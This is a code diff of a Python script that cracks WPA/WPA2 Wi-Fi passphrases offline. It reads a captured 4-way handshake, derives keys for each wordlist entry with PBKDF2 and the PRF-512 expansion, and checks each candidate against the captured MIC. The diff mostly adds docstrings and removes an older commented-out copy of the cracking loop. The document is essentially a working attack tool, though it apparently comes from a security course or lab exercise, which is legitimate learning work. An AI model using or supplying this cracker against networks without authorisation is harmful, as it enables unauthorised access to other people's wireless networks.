@@ -33,9 +33,21 @@ def customPRF512(key,A,B):
         i+=1
         R = R+hmacsha1.digest()
     return R[:blen]
+
 def get_handshake_params(pcap_file: str):
-  # Read capture file -- it contains beacon, authentication, associacion, handshake and data
-  wpa=rdpcap("wpa_handshake.cap")
+  """Read the capture file and grab the handshake parameters
+
+  Args:
+      pcap_file (str): The capture file path
+
+  Returns:
+      str: SSID
+      bytes: B parameter
+      bytes: payload data
+      bytes: MIC to test
+  """
+  
+  wpa=rdpcap(pcap_file)
 
   # Check for Association Request frame and start of handshake
   association_request = ""
@@ -70,6 +82,15 @@ def get_handshake_params(pcap_file: str):
   return ssid, B, pckt_data, mic_to_test
 
 def crack_mic(ssid: str, B: bytes, data: bytes, mic_to_test: bytes, wordlist_file: str):
+  """Crack the WPA passphrase using the MIC, for each passphrase in the wordlist
+
+  Args:
+      ssid (str): SSID of the network
+      B (bytes): The pseudo-random function parameter B
+      data (bytes): The data from the payload of the 4th frame of the 4-way handshake without the MIC
+      mic_to_test (bytes): The MIC to test
+      wordlist_file (str): The path to the wordlist file
+  """
   temp_stderr = sys.stderr
   print("Reading wordlist...")
   num_lines = sum(1 for line in open(wordlist_file, "r"))
@@ -95,35 +116,9 @@ def crack_mic(ssid: str, B: bytes, data: bytes, mic_to_test: bytes, wordlist_fil
           print("No passphrase found")
           exit(-1)
       
-      print("\n\tFound passphrase: ", passphrase.encode("utf-8"))
       sys.stderr = temp_stderr
+      print("\n\tFound passphrase: ", passphrase.decode("utf-8"))
       
-### Open wordlist -> for each passphrase, compute the pmk and then the MIC using the pseudo-random function
-"""
-print ("Reading wordlist...")
-ssid = str.encode(ssid)
-num_lines = sum(1 for line in open('wordlist.txt'))
-
-with open("wordlist.txt", "r") as wordlist:
-  print ("Cracking passphrase...")
-  for passPhrase in tqdm(wordlist, total=num_lines):
-    #Compute 4096 rounds to obtain the 256 bit (32 oct) PMK
-    passPhrase = str.encode(passPhrase).strip()
-    pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
-
-    #expand pmk to obtain PTK
-    ptk = customPRF512(pmk,str.encode("Pairwise key expansion"),B)
-
-    #Compute MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-    mic = hmac.new(ptk[0:16],data,hashlib.sha1).hexdigest()[:32]
-
-    if mic == mic_to_test:
-      print ("Passphrase found:", passPhrase.decode("utf-8"))
-      break
-  else:
-    print ("Passphrase not found in wordlist")
-  wordlist.close()
-  """
   
 if __name__ == "__main__":
   crack_mic(*get_handshake_params("wpa_handshake.cap"), "wordlist.txt")
